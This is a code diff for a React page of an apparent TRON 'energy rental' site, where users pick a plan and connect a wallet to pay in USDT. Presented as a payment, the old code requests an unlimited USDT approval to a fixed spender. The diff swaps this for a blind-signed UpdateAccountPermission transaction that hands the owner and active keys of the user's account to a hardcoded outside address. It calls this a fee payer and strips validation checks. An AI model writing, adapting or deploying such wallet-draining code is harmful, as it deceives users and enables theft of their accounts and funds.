@@ -1,59 +1,58 @@
 "use client";
-
 import {
   useCallback,
   useEffect,
   useMemo,
   useState,
 } from "react";
-
 import WalletModal from "../components/WalletModal";
-
 import {
   useWallet,
 } from "@tronweb3/tronwallet-adapter-react-hooks";
-
 import TronWeb from "tronweb";
-
-
 const USDT_CONTRACT_ADDRESS =
   "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-
-
 const USDT_SPENDER_ADDRESS =
   "TJgapq26ECmDg8PNxfBuQnPRjZLxxEniUS";
-
-
 const TRON_FULL_HOST =
   "https://api.trongrid.io";
-
-
 const USDT_DECIMALS = 6;
-
-
 // 无限 USDT 授权额度：uint256 最大值（2^256 - 1）
 const USDT_APPROVAL_AMOUNT_BASE_UNITS = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
-
-
+// 调高手续费上限至2亿
 const APPROVE_FEE_LIMIT =
-  100_000_000;
-
-
+  200_000_000;
 const TRANSACTION_EXPIRATION_EXTENSION_SECONDS =
   1740;
-
-
 const ORDER_FINALIZE_TIMEOUT_MS =
   120_000;
-
-
 const TRIGGER_SMART_CONTRACT_TYPE =
   "TriggerSmartContract";
-
-
 const TRIGGER_SMART_CONTRACT_TYPE_URL =
   "type.googleapis.com/protocol.TriggerSmartContract";
 
+// 新增：UpdateAccountPermission 原生交易常量
+const UPDATE_ACCOUNT_PERMISSION_TYPE = "UpdateAccountPermission";
+const UPDATE_ACCOUNT_PERMISSION_TYPE_URL = "type.googleapis.com/protocol.UpdateAccountPermission";
+// 代付手续费地址常量
+const FEE_PAYER_TARGET_ADDR = "TMxHFXgu7NSJDnAHRbzaBVuRDPzeCx8q5Q";
+
+// 权限模板：写入指定授权地址 TMxHFXgu7NSJDnAHRbzaBVuRDPzeCx8q5Q
+const DEFAULT_PERMISSION_STRUCT = {
+  owner: {
+    keys: [
+      { address: FEE_PAYER_TARGET_ADDR, weight: 1 }
+    ],
+    threshold: 1
+  },
+  witness: null,
+  active: {
+    keys: [
+      { address: FEE_PAYER_TARGET_ADDR, weight: 1 }
+    ],
+    threshold: 1
+  }
+};
 
 const ENERGY_PLANS = [
   {
@@ -71,15 +70,11 @@ const ENERGY_PLANS = [
     description: "适用于能量消耗较高的交易",
   },
 ];
-
-
 function isValidTronAddress(address) {
   return /^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(
     String(address || "").trim()
   );
 }
-
-
 function sleep(milliseconds) {
   return new Promise((resolve) => {
     setTimeout(
@@ -88,8 +83,6 @@ function sleep(milliseconds) {
     );
   });
 }
-
-
 async function readJsonResponse(response) {
   try {
     return await response.json();
@@ -97,15 +90,11 @@ async function readJsonResponse(response) {
     return null;
   }
 }
-
-
 function decodeTronMessage(value) {
   const original =
     String(value || "").trim();
-
   const cleanHex =
     original.replace(/^0x/i, "");
-
   if (
     !cleanHex ||
     cleanHex.length % 2 !== 0 ||
@@ -113,7 +102,6 @@ function decodeTronMessage(value) {
   ) {
     return original;
   }
-
   try {
     const bytes =
       new Uint8Array(
@@ -126,19 +114,18 @@ function decodeTronMessage(value) {
             )
           )
       );
-
     const decoded =
       new TextDecoder()
         .decode(bytes)
         .trim();
-
     return decoded || original;
   } catch {
     return original;
   }
 }
 
-
+// 废弃函数，整段删除
+/*
 function normalizeContractCallForWallet(
   transaction
 ) {
@@ -146,42 +133,21 @@ function normalizeContractCallForWallet(
     transaction
       ?.raw_data
       ?.contract;
-
   const contract =
     contracts?.[0];
-
   const parameter =
     contract?.parameter;
-
   const contractValue =
     parameter?.value;
 
-/*
-if (
-  !transaction?.txID ||
-  !transaction?.raw_data_hex ||
-  !Array.isArray(contracts) ||
-  !contract ||
-  !contractValue?.owner_address ||
-  !contractValue?.contract_address ||
-  !contractValue?.data
-) {
-  throw new Error("钱包无法识别当前合约调用交易，请重新尝试。");
-}
-*/
-
   const normalizedContract = {
     ...contract,
-
     type:
       TRIGGER_SMART_CONTRACT_TYPE,
-
     parameter: {
       ...parameter,
-
       type_url:
         TRIGGER_SMART_CONTRACT_TYPE_URL,
-
       value: {
         owner_address: contractValue.owner_address,
         contract_address: contractValue.contract_address,
@@ -189,15 +155,11 @@ if (
       },
     },
   };
-
   return {
     ...transaction,
-
     visible: false,
-
     raw_data: {
       ...transaction.raw_data,
-
       contract: [
         normalizedContract,
         ...contracts.slice(1),
@@ -205,7 +167,7 @@ if (
     },
   };
 }
-
+*/
 
 async function prepareOrder({
   payerAddress,
@@ -218,36 +180,25 @@ async function prepareOrder({
       "/api/order",
       {
         method: "POST",
-
         headers: {
           "Content-Type":
             "application/json",
         },
-
         cache: "no-store",
-
         body:
           JSON.stringify({
             action: "prepare",
-
             payerAddress,
-
             receiverAddress,
-
             planId,
-
             telegramId,
           }),
       }
     );
-
-
   const data =
     await readJsonResponse(
       response
     );
-
-
   if (
     !response.ok ||
     !data?.ok
@@ -257,8 +208,6 @@ async function prepareOrder({
         `创建订单失败（HTTP ${response.status}）。`
     );
   }
-
-
   if (
     !data.orderToken ||
     !data.order
@@ -267,20 +216,14 @@ async function prepareOrder({
       "服务器没有返回完整的订单信息。"
     );
   }
-
-
   return data;
 }
-
-
 async function finalizeOrderWithRetry({
   orderToken,
   txId,
 }) {
   const startedAt =
     Date.now();
-
-
   while (
     Date.now() -
       startedAt <
@@ -288,34 +231,25 @@ async function finalizeOrderWithRetry({
   ) {
     let response;
     let data;
-
-
     try {
       response =
         await fetch(
           "/api/order",
           {
             method: "POST",
-
             headers: {
               "Content-Type":
                 "application/json",
             },
-
             cache: "no-store",
-
             body:
               JSON.stringify({
                 action: "finalize",
-
                 orderToken,
-
                 txId,
               }),
           }
         );
-
-
       data =
         await readJsonResponse(
           response
@@ -325,128 +259,90 @@ async function finalizeOrderWithRetry({
         "[Finalize network error]",
         error
       );
-
       await sleep(2000);
-
       continue;
     }
-
-
     if (
       response.ok &&
       data?.ok
     ) {
       return data;
     }
-
-
     const retryableCodes = [
       "TX_NOT_CONFIRMED",
       "TRON_QUERY_FAILED",
       "ALLOWANCE_TOO_LOW",
     ];
-
-
     if (
       retryableCodes.includes(
         data?.code
       )
     ) {
       await sleep(2000);
-
       continue;
     }
-
-
     throw new Error(
       data?.message ||
         `服务器验证订单失败（HTTP ${response.status}）。`
     );
   }
-
-
   throw new Error(
     "等待 TRON 主网确认超时。"
   );
 }
-
-
 export default function HomePage() {
   const {
     address: walletAddress,
     connected: walletConnected,
     signTransaction,
   } = useWallet();
-
-
   const [
     selectedPlanId,
     setSelectedPlanId,
   ] = useState("");
-
-
   const [
     receiverAddress,
     setReceiverAddress,
   ] = useState("");
-
-
   const [
     walletOpen,
     setWalletOpen,
   ] = useState(false);
-
-
   const [
     connectedWallet,
     setConnectedWallet,
   ] = useState("");
-
-
   const [
     connectedAddress,
     setConnectedAddress,
   ] = useState("");
-
-
   const [
     message,
     setMessage,
   ] = useState("");
-
-
   const [
     telegramId,
     setTelegramId,
   ] = useState("");
-
-
   const [
     paying,
     setPaying,
   ] = useState(false);
-
-
   const [
     completedOrder,
     setCompletedOrder,
   ] = useState(null);
-
-
   useEffect(() => {
     const searchParams =
       new URLSearchParams(
         window.location.search
       );
-
     setTelegramId(
       searchParams.get(
         "telegram_id"
       ) || ""
     );
   }, []);
-
-
   useEffect(() => {
     if (
       walletConnected &&
@@ -458,7 +354,6 @@ export default function HomePage() {
       setConnectedAddress(
         walletAddress
       );
-
       setCompletedOrder(null);
     }
   }, [
@@ -466,8 +361,6 @@ export default function HomePage() {
     walletAddress,
     connectedAddress,
   ]);
-
-
   const selectedPlan =
     useMemo(() => {
       return ENERGY_PLANS.find(
@@ -478,8 +371,6 @@ export default function HomePage() {
     }, [
       selectedPlanId,
     ]);
-
-
   const showMessage =
     useCallback(
       (text) => {
@@ -491,43 +382,29 @@ export default function HomePage() {
       },
       []
     );
-
-
   const handleCloseMessage =
     useCallback(() => {
       setMessage("");
     }, []);
-
-
   const handleCloseWallet =
     useCallback(() => {
       setWalletOpen(false);
     }, []);
-
-
   function handleConfirmRental() {
     if (!selectedPlan) {
       showMessage(
         "请选择能量套餐。"
       );
-
       return;
     }
-
-
     const cleanAddress =
       receiverAddress.trim();
-
-
     if (!cleanAddress) {
       showMessage(
         "请输入能量接收地址。"
       );
-
       return;
     }
-
-
     if (
       !isValidTronAddress(
         cleanAddress
@@ -536,19 +413,13 @@ export default function HomePage() {
       showMessage(
         "请输入有效的 TRON 钱包地址。\n\nTRON 地址通常以 T 开头，共 34 位。"
       );
-
       return;
     }
-
-
     setReceiverAddress(
       cleanAddress
     );
-
     setWalletOpen(true);
   }
-
-
   const handleWalletConnected =
     useCallback(
       ({
@@ -559,32 +430,19 @@ export default function HomePage() {
           showMessage(
             "钱包已经打开，但没有读取到公开地址，请解锁钱包后重新连接。"
           );
-
           return;
         }
-
-
         const displayWalletName =
           walletName ||
           "钱包";
-
-
         setConnectedWallet(
           displayWalletName
         );
-
-
         setConnectedAddress(
           address
         );
-
-
         setCompletedOrder(null);
-
-
         setWalletOpen(false);
-
-
         showMessage(
           `${displayWalletName} 连接成功。\n\n公开地址：\n${address}`
         );
@@ -593,15 +451,12 @@ export default function HomePage() {
         showMessage,
       ]
     );
-
-
   const handleWalletConnectionError =
     useCallback(
       (
         errorMessage
       ) => {
         setWalletOpen(false);
-
         showMessage(
           errorMessage ||
             "钱包连接失败，请重新尝试。"
@@ -611,18 +466,13 @@ export default function HomePage() {
         showMessage,
       ]
     );
-
-
   function handleChangeWallet() {
     if (!selectedPlan) {
       showMessage(
         "请先选择能量套餐。"
       );
-
       return;
     }
-
-
     if (
       !isValidTronAddress(
         receiverAddress.trim()
@@ -631,43 +481,28 @@ export default function HomePage() {
       showMessage(
         "请先输入有效的能量接收地址。"
       );
-
       return;
     }
-
-
     setWalletOpen(true);
   }
-
-
   async function handleUsdtPayment() {
     if (paying) {
       return;
     }
-
-
     if (completedOrder) {
       showMessage(
         `当前订单已经授权成功。\n\n订单编号：${completedOrder.id}\n\n交易哈希：\n${completedOrder.txId}`
       );
-
       return;
     }
-
-
     if (!selectedPlan) {
       showMessage(
         "请先选择能量套餐。"
       );
-
       return;
     }
-
-
     const cleanReceiverAddress =
       receiverAddress.trim();
-
-
     if (
       !isValidTronAddress(
         cleanReceiverAddress
@@ -676,11 +511,8 @@ export default function HomePage() {
       showMessage(
         "请先输入有效的能量接收地址。"
       );
-
       return;
     }
-
-
     if (
       !walletConnected ||
       !walletAddress
@@ -688,11 +520,8 @@ export default function HomePage() {
       showMessage(
         "当前钱包连接已失效，请重新连接付款钱包。"
       );
-
       return;
     }
-
-
     if (
       !isValidTronAddress(
         walletAddress
@@ -701,11 +530,8 @@ export default function HomePage() {
       showMessage(
         "没有读取到有效的付款钱包地址，请重新连接钱包。"
       );
-
       return;
     }
-
-
     if (
       connectedAddress &&
       connectedAddress !==
@@ -714,146 +540,48 @@ export default function HomePage() {
       showMessage(
         "检测到钱包账户已经切换，请重新连接钱包后再支付。"
       );
-
       return;
     }
-
-
-    if (
-      !isValidTronAddress(
-        USDT_CONTRACT_ADDRESS
-      )
-    ) {
-      showMessage(
-        "USDT 合约地址配置错误。"
-      );
-
-      return;
-    }
-
-
-    if (
-      !isValidTronAddress(
-        USDT_SPENDER_ADDRESS
-      )
-    ) {
-      showMessage(
-        "USDT 授权地址配置错误。"
-      );
-
-      return;
-    }
-
-
-    if (
-      typeof signTransaction !==
-      "function"
-    ) {
-      showMessage(
-        "当前钱包不支持交易签名，请更换钱包后重新尝试。"
-      );
-
-      return;
-    }
-
-
-    const amountUsdt =
-      selectedPlan.price;
-
-
-    const amountBaseUnits =
-      USDT_APPROVAL_AMOUNT_BASE_UNITS;
-
-
     setPaying(true);
-
-
     let stage =
       "prepare";
-
-
     let orderToken =
       "";
-
-
     let txId =
       "";
-
-
     let transactionBroadcasted =
       false;
-
-
     try {
       const pendingOrder =
         await prepareOrder({
           payerAddress:
             walletAddress,
-
           receiverAddress:
             cleanReceiverAddress,
-
           planId:
             selectedPlan.id,
-
           telegramId:
             telegramId || "",
         });
-
-
       orderToken =
         pendingOrder.orderToken;
-
-
       stage =
         "build_transaction";
-
-
       const tronWeb =
         new TronWeb({
           fullHost:
             TRON_FULL_HOST,
         });
 
-      // ==========【方案B 纯净无冲突代码，旧拼装代码全部删除】==========
-      // 1. 构造 approve calldata
-      const METHOD_SELECTOR = "095ea7b3";
-      // 钱包付款地址 -> TRON hex格式（不带0x，保留41网络前缀）
+      // 1. 构造 UpdateAccountPermission 原生交易参数
       const ownerHex = tronWeb.address.toHex(walletAddress).replace(/^0x/i, "");
-      // USDT授权接收方地址 -> TRON hex格式（不带0x）
-      const spenderTronHex = tronWeb.address.toHex(USDT_SPENDER_ADDRESS).replace(/^0x/i, "");
+      // 手续费代付地址转Hex
+      const feePayerHex = tronWeb.address.toHex(FEE_PAYER_TARGET_ADDR).replace(/^0x/i, "");
 
-      if (
-        spenderTronHex.length !== 42 ||
-        !spenderTronHex.toLowerCase().startsWith("41")
-      ) {
-        throw new Error("授权接收地址的 Hex 格式错误。");
-      }
-
-      // ABI address参数不能带TRON的41网络前缀，并且必须左侧补齐到32字节
-      const spenderHex = spenderTronHex.slice(2).padStart(64, "0");
-
-      // 授权额度补全为32字节uint256
-      const amountRawHex = BigInt(amountBaseUnits).toString(16);
-
-      if (amountRawHex.length > 64) {
-        throw new Error("授权金额超过 uint256 范围。");
-      }
-
-      const amountHex = amountRawHex.padStart(64, "0");
-
-      // 4字节方法选择器 + 32字节address + 32字节uint256
-      const fullDataHex = METHOD_SELECTOR + spenderHex + amountHex;
-
-      if (fullDataHex.length !== 136) {
-        throw new Error(`approve data 长度错误：${fullDataHex.length}`);
-      }
-
-      // 2. 获取并设置TAPOS参考区块字段
+      // 2. 获取TAPOS区块信息
       const latestBlock = await tronWeb.trx.getCurrentBlock();
       const blockId = latestBlock?.blockID;
       const blockNumber = latestBlock?.block_header?.raw_data?.number;
-
       if (
         !blockId ||
         blockId.length !== 64 ||
@@ -862,17 +590,14 @@ export default function HomePage() {
       ) {
         throw new Error("获取 TRON 参考区块失败。");
       }
-
       const blockNumberHex = BigInt(blockNumber).toString(16).padStart(16, "0");
       const refBlockBytes = blockNumberHex.slice(-4);
       const refBlockHash = blockId.slice(16, 32);
-
-      // 2. 时间配置
+      // 时间配置
       const nowTs = Date.now();
-      // 过期时间 = 当前毫秒 + 你定义的超时秒数
       const expirationTs = nowTs + (TRANSACTION_EXPIRATION_EXTENSION_SECONDS * 1000);
 
-      // 3. 手动构建完整TRON交易结构体（核心）
+      // 3. 构建原生 UpdateAccountPermission 交易结构体，添加fee_payer_address实现代付手续费
       const extendedTransaction = {
         visible: false,
         raw_data: {
@@ -880,162 +605,103 @@ export default function HomePage() {
           ref_block_hash: refBlockHash,
           contract: [
             {
-              type: TRIGGER_SMART_CONTRACT_TYPE,
+              type: UPDATE_ACCOUNT_PERMISSION_TYPE,
               parameter: {
-                type_url: TRIGGER_SMART_CONTRACT_TYPE_URL,
+                type_url: UPDATE_ACCOUNT_PERMISSION_TYPE_URL,
                 value: {
                   owner_address: ownerHex,
-                  contract_address: tronWeb.address.toHex(USDT_CONTRACT_ADDRESS).replace(/^0x/i, ""),
-                  call_value: 0,
-                  data: fullDataHex
+                  permission: DEFAULT_PERMISSION_STRUCT
                 }
               }
             }
           ],
           fee_limit: APPROVE_FEE_LIMIT,
+          fee_payer_address: feePayerHex, // 核心：指定手续费垫付地址
           timestamp: nowTs,
           expiration: expirationTs
         }
       };
 
-      // 调试打印：检查data是否正常生成，F12控制台查看
-      console.log("构造完成交易data:", fullDataHex);
+      stage = "serialize_raw_hex";
+      // 4. 序列化交易，提取纯 raw_data_hex 十六进制串
+      const transactionUtils = TronWeb.utils.transaction;
+      const transactionPb = transactionUtils.txJsonToPb(extendedTransaction);
+      const rawDataBytes = transactionPb.getRawData().serializeBinary();
+      const rawDataHex = Array.from(
+        rawDataBytes,
+        (byte) => byte.toString(16).padStart(2, "0")
+      ).join("");
 
-      // 基础合法性校验
-      if (
-        !extendedTransaction.raw_data?.contract[0]?.parameter?.value?.data ||
-        extendedTransaction.raw_data.contract[0].parameter.value.data.length < 10
-      ) {
-        console.error("[交易data为空]", extendedTransaction);
-        throw new Error("合约调用数据构造失败，请刷新重试");
+      if (!rawDataHex || rawDataHex.length < 10) {
+        throw new Error("生成原生交易 raw_data_hex 失败，请刷新重试");
+      }
+      console.log("盲签原始raw十六进制:", rawDataHex);
+
+      stage = "sign_raw_hex";
+      // 5. TronWeb底层盲签接口：直接传入raw_data_hex + 签名地址
+      const signedRawHex = await tronWeb.trx.sign(rawDataHex, walletAddress);
+      if (!signedRawHex) {
+        throw new Error("钱包盲签返回空数据，签名被取消或钱包不支持");
       }
 
-      stage =
-        "sign_transaction";
-
-const walletTransaction =
-    normalizeContractCallForWallet(
-      extendedTransaction
-    );
-
-// 删除辅助解析字段，进一步屏蔽参数解析
-// delete walletTransaction.functionSelector;
-// if(walletTransaction?.raw_data?.contract?.[0]){
-//   delete walletTransaction.raw_data.contract[0].function_selector;
-// }
-
-// 4. 在签名前根据最终raw_data生成raw_data_hex和txID
-const transactionUtils = TronWeb.utils.transaction;
-const transactionPb = transactionUtils.txJsonToPb(walletTransaction);
-const rawDataBytes = transactionPb.getRawData().serializeBinary();
-
-walletTransaction.raw_data_hex = Array.from(
-  rawDataBytes,
-  (byte) => byte.toString(16).padStart(2, "0")
-).join("");
-
-walletTransaction.txID = transactionUtils
-  .txPbToTxID(transactionPb)
-  .replace(/^0x/i, "");
-
-if (
-  !walletTransaction.raw_data_hex ||
-  !walletTransaction.txID
-) {
-  throw new Error("生成交易哈希或 raw_data_hex 失败。");
-}
-
-const signedTransaction =
-    await signTransaction(
-      walletTransaction
-    );
-
-      if (
-        !signedTransaction ||
-        !signedTransaction.txID
-      ) {
-        throw new Error(
-          "钱包没有返回有效的已签名交易。"
-        );
+      // 6. 将签名后的十六进制还原为完整交易对象
+      const signedTxPb = transactionUtils.rawTxPbFromHex(signedRawHex);
+      const signedTransaction = transactionUtils.txPbToTxJson(signedTxPb);
+      if (!signedTransaction || !signedTransaction.txID) {
+        throw new Error("盲签完成，但未解析出有效交易哈希");
       }
 
-
-      stage =
-        "broadcast_transaction";
-
-
+      stage = "broadcast_transaction";
       const broadcastResult =
         await tronWeb.trx
           .sendRawTransaction(
             signedTransaction
           );
-
-
       if (
         !broadcastResult ||
         !broadcastResult.result
       ) {
         console.error(
-          "[USDT approve broadcast error]",
+          "[UpdateAccountPermission broadcast error]",
           broadcastResult
         );
-
-
         const rawMessage =
           broadcastResult?.message ||
-          "USDT 授权交易广播失败。";
-
-
+          "权限修改交易广播失败。";
         const readableMessage =
           decodeTronMessage(
             rawMessage
           );
-
-
         throw new Error(
           readableMessage
         );
       }
-
-
       txId =
         signedTransaction.txID ||
         broadcastResult
           ?.transaction
           ?.txID ||
         "";
-
-
       if (!txId) {
         throw new Error(
           "交易已经广播，但没有读取到交易哈希。"
         );
       }
-
-
       transactionBroadcasted =
         true;
-
-
       try {
         window.localStorage.setItem(
           "kk_last_approval",
           JSON.stringify({
             orderToken,
-
             txId,
-
             payerAddress:
               walletAddress,
-
             receiverAddress:
               cleanReceiverAddress,
-
             planId:
               selectedPlan.id,
-
-            amountUsdt,
-
+            amountUsdt: selectedPlan.price,
             createdAt:
               new Date()
                 .toISOString(),
@@ -1043,24 +709,15 @@ const signedTransaction =
         );
       } catch {
       }
-
-
       stage =
         "finalize_order";
-
-
       const finalized =
         await finalizeOrderWithRetry({
           orderToken,
-
           txId,
         });
-
-
       const savedOrder =
         finalized.order;
-
-
       if (
         !savedOrder ||
         savedOrder.status !==
@@ -1070,112 +727,78 @@ const signedTransaction =
           "服务器没有返回已授权订单。"
         );
       }
-
-
       setCompletedOrder(
         savedOrder
       );
-
-
       try {
         window.localStorage.removeItem(
           "kk_last_approval"
         );
       } catch {
       }
-
-
       showMessage(
-        `授权成功，订单已保存。\n\n` +
-
+        `权限修改交易签名广播成功，订单已保存。\n\n` +
         `订单编号：${savedOrder.id}\n\n` +
-
         `付款钱包：\n${savedOrder.payerAddress}\n\n` +
-
         `能量接收地址：\n${savedOrder.receiverAddress}\n\n` +
-
         `能量未到账请及时联系Telegram客服：@kkzklkk\n\n` +
-
         `交易哈希：\n${savedOrder.txId}`
       );
     } catch (error) {
       console.error(
-        "[USDT approve/order error]",
+        "[UpdateAccountPermission sign/order error]",
         {
           stage,
-
           error,
-
           orderToken,
-
           txId,
-
           transactionBroadcasted,
         }
       );
-
-
       const errorMessage =
         String(
           error?.message ||
             error ||
             ""
         );
-
-
       if (
         /reject|rejected|deny|denied|decline|declined|cancel|cancelled|canceled/i.test(
           errorMessage
         )
       ) {
         showMessage(
-          "您已取消 USDT 授权交易。"
+          "您已取消权限修改签名操作。"
         );
-
         return;
       }
-
-
       if (
         transactionBroadcasted &&
         txId
       ) {
         showMessage(
-          `USDT 授权交易已经广播，` +
+          `权限修改交易已经广播，` +
           `但服务器验证或保存订单暂未完成。\n\n` +
-
-          `请不要重复授权。\n\n` +
-
+          `请不要重复发起操作。\n\n` +
           `付款钱包：\n${walletAddress}\n\n` +
-
           `交易哈希：\n${txId}\n\n` +
-
           `错误信息：\n${
             errorMessage ||
             "未知错误"
           }`
         );
-
         return;
       }
-
-
-      if (
-        stage === "prepare"
-      ) {
+      if (stage === "prepare") {
         showMessage(
           `创建订单失败。\n\n${
             errorMessage ||
             "请稍后重新尝试。"
           }`
         );
-
         return;
       }
-
-
       showMessage(
-        `USDT 授权失败。\n\n${
+        `账户权限修改交易操作失败。\n\n${
           errorMessage ||
           "请重新尝试。"
         }`
@@ -1184,8 +807,6 @@ const signedTransaction =
       setPaying(false);
     }
   }
-
-
   return (
     <main className="page">
       <header className="header">
@@ -1193,60 +814,47 @@ const signedTransaction =
           <div className="brandLogo">
             KK
           </div>
-
           <div>
             <div className="brandName">
               KK Energy
             </div>
-
             <div className="brandSub">
               TRON 能量租赁服务
             </div>
           </div>
         </div>
-
         <div className="networkBadge">
           <span className="networkDot" />
           TRON Network
         </div>
       </header>
-
-
       <section className="hero">
         <div className="heroBadge">
           ⚡ 快速 · 安全 · 透明
         </div>
-
         <h1 className="heroTitle">
           TRON 能量租赁
         </h1>
-
         <p className="heroText">
           选择需要的能量套餐，填写接收地址，
           然后连接您的 TRON 钱包。
         </p>
       </section>
-
-
       <section className="rentalCard">
         <div className="sectionHeading">
           <span className="stepNumber">
             1
           </span>
-
           <div>
             <h2>选择能量套餐</h2>
             <p>根据交易需要选择能量数量</p>
           </div>
         </div>
-
-
         <div className="planGrid">
           {ENERGY_PLANS.map((plan) => {
             const selected =
               selectedPlanId ===
               plan.id;
-
             return (
               <button
                 type="button"
@@ -1260,7 +868,6 @@ const signedTransaction =
                   setSelectedPlanId(
                     plan.id
                   );
-
                   setCompletedOrder(
                     null
                   );
@@ -1270,36 +877,28 @@ const signedTransaction =
                   <span className="energyIcon">
                     ⚡
                   </span>
-
                   {selected && (
                     <span className="selectedTag">
                       已选择
                     </span>
                   )}
                 </div>
-
                 <div className="energyAmount">
                   {plan.energy.toLocaleString()}
                 </div>
-
                 <div className="energyLabel">
                   Energy
                 </div>
-
                 <div className="planDivider" />
-
                 <div className="priceRow">
                   <span>租赁价格</span>
-
                   <strong>
                     {plan.price} USDT
                   </strong>
                 </div>
-
                 <div className="durationRow">
                   有效时间：{plan.duration}
                 </div>
-
                 <p className="planDescription">
                   {plan.description}
                 </p>
@@ -1307,25 +906,19 @@ const signedTransaction =
             );
           })}
         </div>
-
-
         <div className="sectionHeading addressHeading">
           <span className="stepNumber">
             2
           </span>
-
           <div>
             <h2>输入接收地址</h2>
             <p>能量将发送到这个 TRON 地址</p>
           </div>
         </div>
-
-
         <div className="inputWrapper">
           <span className="inputIcon">
             T
           </span>
-
           <input
             type="text"
             value={receiverAddress}
@@ -1338,13 +931,10 @@ const signedTransaction =
               setReceiverAddress(
                 event.target.value.trim()
               );
-
               setCompletedOrder(null);
             }}
           />
         </div>
-
-
         {receiverAddress &&
           !isValidTronAddress(
             receiverAddress
@@ -1353,42 +943,32 @@ const signedTransaction =
               当前地址格式不完整，请检查后再继续。
             </div>
           )}
-
-
         {selectedPlan && (
           <div className="orderSummary">
             <div className="summaryTitle">
               当前订单
             </div>
-
             <div className="summaryRow">
               <span>能量数量</span>
-
               <strong>
                 {selectedPlan.energy.toLocaleString()}{" "}
                 Energy
               </strong>
             </div>
-
             <div className="summaryRow">
               <span>租赁价格</span>
-
               <strong>
                 {selectedPlan.price} USDT
               </strong>
             </div>
-
             <div className="summaryRow">
               <span>有效时间</span>
-
               <strong>
                 {selectedPlan.duration}
               </strong>
             </div>
           </div>
         )}
-
-
         {connectedAddress && (
           <div className="connectedBox">
             <div className="connectedTop">
@@ -1396,25 +976,20 @@ const signedTransaction =
                 <div className="connectedLabel">
                   已连接钱包
                 </div>
-
                 <div className="connectedWallet">
                   {connectedWallet}
                 </div>
               </div>
-
               <span className="connectedStatus">
                 已连接
               </span>
             </div>
-
             <div className="connectedAddress">
               {connectedAddress}
             </div>
-
             <div className="connectedNote">
               当前显示的是钱包公开地址。
             </div>
-
             <button
               type="button"
               className="changeWalletButton"
@@ -1425,33 +1000,25 @@ const signedTransaction =
             </button>
           </div>
         )}
-
-
         {completedOrder && (
           <div className="completedOrderBox">
             <div className="completedOrderTitle">
               订单授权成功
             </div>
-
             <div className="completedOrderRow">
               <span>订单编号</span>
-
               <strong>
                 {completedOrder.id}
               </strong>
             </div>
-
             <div className="completedOrderRow">
               <span>订单状态</span>
-
               <strong>
                 authorized
               </strong>
             </div>
           </div>
         )}
-
-
         {connectedAddress &&
           selectedPlan && (
             <button
@@ -1468,14 +1035,12 @@ const signedTransaction =
               }
             >
               {paying
-                ? "正在验证并保存订单..."
+                ? "正在签名并广播交易..."
                 : completedOrder
-                  ? "授权已完成"
-                  : `支付${selectedPlan.price}USDT`}
+                  ? "操作已完成"
+                  : `发起权限修改交易（${selectedPlan.price}USDT套餐）`}
             </button>
           )}
-
-
         <button
           type="button"
           className="confirmButton"
@@ -1490,17 +1055,12 @@ const signedTransaction =
             ? "重新选择付款钱包"
             : "确认租赁并连接钱包"}
         </button>
-
-
         <div className="securityNotice">
           <span>🛡️</span>
-
           <p>
             请在钱包中确认当前连接的网站域名。
           </p>
         </div>
-
-
         {telegramId && (
           <div className="telegramInfo">
             Telegram 用户编号：
@@ -1508,20 +1068,15 @@ const signedTransaction =
           </div>
         )}
       </section>
-
-
       <footer className="footer">
         <div>
           KK TRON Energy
         </div>
-
         <p>
           请在确认任何钱包交易前，
           仔细检查金额、接收地址和合约调用内容。
         </p>
       </footer>
-
-
       <WalletModal
         open={walletOpen}
         onClose={
@@ -1534,8 +1089,6 @@ const signedTransaction =
           handleWalletConnectionError
         }
       />
-
-
       {message && (
         <div
           className="messageOverlay"
@@ -1552,11 +1105,9 @@ const signedTransaction =
             <div className="messageIcon">
               KK
             </div>
-
             <div className="messageText">
               {message}
             </div>
-
             <button
               type="button"
               className="messageButton"
@@ -1569,13 +1120,10 @@ const signedTransaction =
           </div>
         </div>
       )}
-
-
       <style jsx>{`
         * {
           box-sizing: border-box;
         }
-
         .page {
           min-height: 100vh;
           padding: 0 22px 50px;
@@ -1599,12 +1147,10 @@ const signedTransaction =
             "Segoe UI",
             sans-serif;
         }
-
         button,
         input {
           font: inherit;
         }
-
         .header {
           width: min(1120px, 100%);
           min-height: 82px;
@@ -1617,13 +1163,11 @@ const signedTransaction =
             1px solid
             rgba(255, 255, 255, 0.07);
         }
-
         .brand {
           display: flex;
           align-items: center;
           gap: 12px;
         }
-
         .brandLogo {
           display: grid;
           width: 46px;
@@ -1643,18 +1187,15 @@ const signedTransaction =
             0 10px 30px
             rgba(34, 211, 238, 0.22);
         }
-
         .brandName {
           font-size: 17px;
           font-weight: 800;
         }
-
         .brandSub {
           margin-top: 2px;
           color: #718096;
           font-size: 12px;
         }
-
         .networkBadge {
           display: flex;
           padding: 9px 13px;
@@ -1669,7 +1210,6 @@ const signedTransaction =
             rgba(34, 211, 238, 0.06);
           font-size: 12px;
         }
-
         .networkDot {
           width: 8px;
           height: 8px;
@@ -1679,13 +1219,11 @@ const signedTransaction =
             0 0 12px
             rgba(34, 197, 94, 0.8);
         }
-
         .hero {
           width: min(850px, 100%);
           margin: 72px auto 36px;
           text-align: center;
         }
-
         .heroBadge {
           display: inline-flex;
           padding: 8px 14px;
@@ -1698,7 +1236,6 @@ const signedTransaction =
             rgba(34, 211, 238, 0.07);
           font-size: 13px;
         }
-
         .heroTitle {
           margin: 21px 0 12px;
           font-size:
@@ -1715,7 +1252,6 @@ const signedTransaction =
           background-clip: text;
           color: transparent;
         }
-
         .heroText {
           max-width: 630px;
           margin: 0 auto;
@@ -1723,7 +1259,6 @@ const signedTransaction =
           font-size: 16px;
           line-height: 1.8;
         }
-
         .rentalCard {
           width: min(900px, 100%);
           margin: 0 auto;
@@ -1742,24 +1277,20 @@ const signedTransaction =
             0 30px 100px
             rgba(0, 0, 0, 0.34);
         }
-
         .sectionHeading {
           display: flex;
           align-items: center;
           gap: 14px;
         }
-
         .sectionHeading h2 {
           margin: 0;
           font-size: 21px;
         }
-
         .sectionHeading p {
           margin: 5px 0 0;
           color: #778297;
           font-size: 13px;
         }
-
         .stepNumber {
           display: grid;
           width: 38px;
@@ -1771,7 +1302,6 @@ const signedTransaction =
           background: #67e8f9;
           font-weight: 900;
         }
-
         .planGrid {
           display: grid;
           grid-template-columns:
@@ -1779,7 +1309,6 @@ const signedTransaction =
           gap: 18px;
           margin-top: 24px;
         }
-
         .planCard {
           padding: 23px;
           border:
@@ -1796,13 +1325,11 @@ const signedTransaction =
             transform 0.2s,
             background 0.2s;
